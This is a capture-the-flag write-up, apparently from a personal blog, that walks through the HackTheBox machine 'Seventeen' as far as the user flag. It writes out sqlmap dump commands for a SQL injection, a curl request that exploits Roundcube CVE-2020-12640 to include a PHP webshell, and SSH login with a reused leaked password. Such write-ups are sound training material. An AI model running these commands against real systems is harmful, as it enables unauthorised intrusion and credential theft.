---
title: "Seventeen"
date: 2027-01-06 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, hard, sql-injection, vhost, file-upload, lfi, roundcube, cve-2020-12640, credential-reuse]
description: "Seventeen chains three web vhosts: an unauthenticated SQL injection in an exam management system leaks login credentials and points at a hidden file-management vhost, where an upload feature combines with a path-traversal flaw in an outdated Roundcube webmail (CVE-2020-12640) to include a PHP webshell. From the resulting www-data shell inside a Docker container, a hardcoded database password is reused over SSH to land the user flag."
image:
    path: /assets/Images/seventeen-001_foothold_user-flag.png
---

## Overview

Seventeen is a hard-difficulty Linux box built around several web virtual hosts that each leak a clue to the next. The path to user chains an unauthenticated SQL injection, a hidden file-upload site, and a path-traversal include in an old Roundcube install to reach code execution as `www-data` in a container — then a reused database password unlocks SSH as `mark`. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,40.0 233.7,122.8 188.8,203.4 124.1,185.6 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Vhost-enumeration-heavy box chasing clues across three sites; enumeration dominates, with an EDB SQLi and Roundcube CVE-2020-12640 LFI plus credential reuse to SSH as mark.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | host SSH |
| 80   | Apache | static site → `seventeen.htb` |
| 8000 | Apache | Forbidden by default; vhost-gated, serves apps by hostname |

```bash
nmap -sC -sV 10.129.227.143
```

Port 80 reveals the hostname `seventeen.htb`. Port 8000 returns `Forbidden` until you reach it through a valid hostname, so vhost enumeration is the way in.

## Enumeration

Fuzz for virtual hosts off the base name, then chase each clue:

```bash
ffuf -H 'Host: FUZZ.seventeen.htb' -u 'http://seventeen.htb' \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -fw 2760
# add to /etc/hosts: seventeen.htb exam.seventeen.htb (and later oldmanagement / mastermailer)
```

`exam.seventeen.htb` runs an **Examination Management System** with an unauthenticated SQL injection in the `id` parameter (Exploit-DB 50725). Dumping the databases yields student/login data, and one table's `avatar` path reveals a further vhost, `oldmanagement`, plus the `mastermailer` (Roundcube) vhost referenced in an uploaded document.

```bash
sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -p id --dbs --level 3 --batch
sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -p id --batch -D db_sfms -T student --dump --threads=10
sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -p id --batch -D erms_db -T users --dump
```

This gives a working login for the `oldmanagement` file-management app (a student number + password) and points at a Roundcube webmail instance whose version (1.4.2) is old enough to be vulnerable to **CVE-2020-12640**.

## Foothold

`oldmanagement` lets the logged-in student upload files, which land under `files/<student_id>/`. Roundcube's installer has an unsanitised plugin path (`_plugins_<name>`) that gets `require()`d — a local file inclusion. Roundcube resolves `<plugin>/<plugin>.php`, so the uploaded shell must be named to match an existing directory in the upload folder (a `papers/` directory existed, so the shell is `papers.php`).

```bash
# find an existing directory name under the upload path to match the shell name
ffuf -u http://oldmanagement.seventeen.htb:8000/oldmanagement/files/<student_id>/FUZZ \
  -H 'Cookie: PHPSESSID=<sess>' \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -fc 404
```

```bash
# upload papers.php (a PHP webshell), then include it via the Roundcube installer (CVE-2020-12640)
curl -s -X POST 'http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php' \
  -b 'PHPSESSID=<sess>' \
  --data '_step=2&_product_name=x&_plugins_qwerty=../../../../../../../../../var/www/html/oldmanagement/files/<student_id>/papers&submit=UPDATE+CONFIG'

# trigger the include
curl -s 'http://mastermailer.seventeen.htb:8000/mastermailer'
```

That yields a shell as `www-data` inside a Docker container. A database config file there holds a hardcoded password that turns out to be reused as the SSH password for the host user `mark`:

```bash
cat /var/www/html/employeemanagementsystem/process/dbh.php   # leaks a DB password
sshpass -p '<redacted>' ssh mark@10.129.227.143
```

## User flag

```bash
cat /home/mark/user.txt   # HTB{...}
```

![user flag](/assets/Images/seventeen-001_foothold_user-flag.png)

Access as `mark` achieved and the user flag captured.

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Seventeen-avatar.png" alt="Seventeen" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
